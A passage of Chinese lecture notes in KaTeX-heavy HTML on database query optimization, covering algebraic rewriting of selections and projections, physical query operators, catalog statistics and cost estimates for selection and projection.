style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span></span></span></span></eq>的选择表达式变成串接形式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mrow><mi>F</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">(</mo><msub><mi>σ</mi><mrow><mi>F</mi><mi>n</mi></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F1}(\sigma_{F2}(...(\sigma_{Fn}(E))))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">...</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))))</span></span></span></span></eq></li><li>对每个选择，依据定理L4-L9，尽可能把它移动到树的底部</li><li>对每个投影，依据定理L3,7,10,5,尽可能的移到书的底部。如果一个投影是对表达式的所有属性进行的，则可以删去</li><li>依据定理L4，5把串接的选择和投影组合为单个选择，单个投影，或者一个选择后跟一个投影</li><li>对修改后的语法树，将其内节点按以下方式分组：<ul><li>每个二元运算节点和其所有的一元运算的直接祖先放在一组；对于所有的后代节点，若后代节点是一串一元运算且树叶为终点，则将这些一元运算节点放在改组中；如该二元运算节点是笛卡尔积，则其后代节点不能和它组合成连接，则不能将后代节点归入改组</li></ul></li><li>产生一个程序：它以每组节点为一步，但后代组先执行</li></ul></li></ul><h3 id="2106-%E7%89%A9%E7%90%86%E5%B1%82%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">2106 物理层查询优化</h3><h4 id="%EF%BC%881%EF%BC%89%E7%89%A9%E7%90%86%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E2%80%93%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF" tabindex="-1">（1）物理查询优化–总体思路</h4><ul><li><p>获取数据库的相关信息（定期统计）</p></li><li><p>实现同一关系操作的不同例行程序</p></li><li><p>选择相应的例行程序</p></li><li><p>依据相关信息进行代价估算，选择代价最少的例行程序及确定相应的参数</p></li><li><p>形成查询计划：以基本的例行程序为基本，确定这些例行程序的执行顺序</p></li><li><p>物理查询运算符</p><ul><li>获取关系元组的操作<ul><li>表空间扫描法</li><li>表空间扫描排序法</li><li>索引扫描法</li><li>索引扫描排序法</li></ul></li><li>关系操作的各种实现算法<ul><li>一趟算法，两趟算法</li><li>基于索引算法，基于散列算法，基于排序算法</li></ul></li><li>迭代器构造–流水化，物化</li></ul></li></ul><p>物理查询运算符通常是关系代数操作符的一个特定实现</p><h4 id="%EF%BC%882%EF%BC%89%E8%A1%A1%E9%87%8F%E4%B8%80%E4%B8%AA%E7%89%A9%E7%90%86%E6%9F%A5%E8%AF%A2%E8%AE%A1%E5%88%92" tabindex="-1">（2）衡量一个物理查询计划</h4><p>依据数据库中的一些统计信息–存放在数据字典或系统目录中的</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">T_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">T(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>关系R的元组数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">B_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">B(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>关系R的磁盘块数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">I_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">I(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>关系R的每个元组的字节数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">f_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">f(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>R的块因子，即一个块中能够储存的R的元组数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">V(A,R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>R中属性A出现不同值的数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>C</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">SC(A,R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">SC</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>R中属性A的选择基数，满足A上等值条件的平均记录数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">b:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>每个磁盘块的字节数</li><li>…</li></ul><p>DBMS依据上述统计信息对DB操作的各种物理查询计划进行评估，以确定最优的计划予以执行。</p><h4 id="%EF%BC%883%EF%BC%89%E5%A6%82%E4%BD%95%E6%94%B6%E9%9B%86%E8%BF%99%E4%BA%9B%E4%BF%A1%E6%81%AF" tabindex="-1">（3）如何收集这些信息</h4><ul><li>当一个表装入内存和创建索引的时候，统计信息不是被自动收集的，必须有DBA使用特定的命令来完成信息统计，这些命令就是收集统计信息并把其存入系统目录中的实用程序</li><li>随着表的更新操作。统计信息可能会过时，过时的统计信息会使DBMS确定方案时决策错误，因此要求DBA定期的对有频繁更新操作的Table进行统计</li><li>DBA要熟悉统计信息收集命令的使用，并定期执行</li></ul><h3 id="2107-%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">2107 代价估算</h3><h4 id="%EF%BC%881%EF%BC%89%E6%8A%95%E5%BD%B1%E8%BF%90%E7%AE%97%E7%9A%84%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">（1）投影运算的代价估算</h4><ul><li>投影运算并未减少行数，但可能有效地减少了存储结果关系地块数</li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%80%89%E6%8B%A9%E8%BF%90%E7%AE%97%E5%9C%B0%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">（2）选择运算地代价估算</h4><p>估算选择运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msub><mi>σ</mi><mrow><mi>A</mi><mo>=</mo><mi>c</mi></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=\sigma_{A=c}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq>的大小</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq>介于0 到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>−</mo><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">T(R)-V(R,A)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>之间<ul><li>最多：A属性不同值的元组都只存在一个，剩余的都是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">A=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></eq>的分组</li></ul></li><li>估计：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(S)=T(R)/V(R,A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq><ul><li>A属性的不同值的元组假设是平均分布的</li></ul></li><li>当不知道<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(R,A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq>时，估计：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">T(S)=T(R)/10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mord">/10</span></span></span></span></eq></li></ul><p>估算选择运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msub><mi>σ</mi><mrow><mi>A</mi><mo>&lt;</mo><mi>c</mi></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=\sigma_{A&lt;c}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mrel mtight">&lt;</span><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq>的大小</p><ul><li>一般取<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">T(S)=T(R)/3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mord">/3</span></span></span></span></eq></li></ul><p>估算选择运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msub><mi>σ</mi><mrow><mi>C</mi><mn>1</mn><mi>o</mi><mi>r</mi><mi>C</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=\sigma_{C1 or C2}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mord mtight">1</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">or</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq></p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mrow><mi>m</mi><mn>1</mn></mrow><mi>n</mi></mfrac><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mrow><mi>m</mi><mn>2</mn></mrow><mi>n</mi></mfrac><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(S)=n(1 - (1-\frac{m1}{n})(1-\frac{m2}{n}))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" 